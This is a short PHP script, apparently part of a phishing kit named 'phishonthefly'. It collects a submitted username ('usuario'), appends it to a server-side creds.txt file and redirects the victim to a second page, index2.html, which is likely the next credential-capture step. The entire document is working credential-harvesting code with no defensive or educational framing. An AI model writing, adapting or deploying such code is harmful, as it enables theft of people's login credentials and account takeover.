<?php
if (isset($_POST["usuario"])) {
    $user = $_POST["usuario"];
    $filePath = "/var/www/phishonthefly/creds.txt";
    $file = @fopen($filePath, "a+");
    if ($file === false) {
        error_log("Error al abrir el archivo {$filePath} para escritura.");
    } else {
        $data = "Usuario: " . $user . "\n";
        fwrite($file, $data);
        fclose($file);
    }
    header("Location: ./index2.html");
    exit;
} else {
    header("Location: ./index2.html");
    exit;
}
?>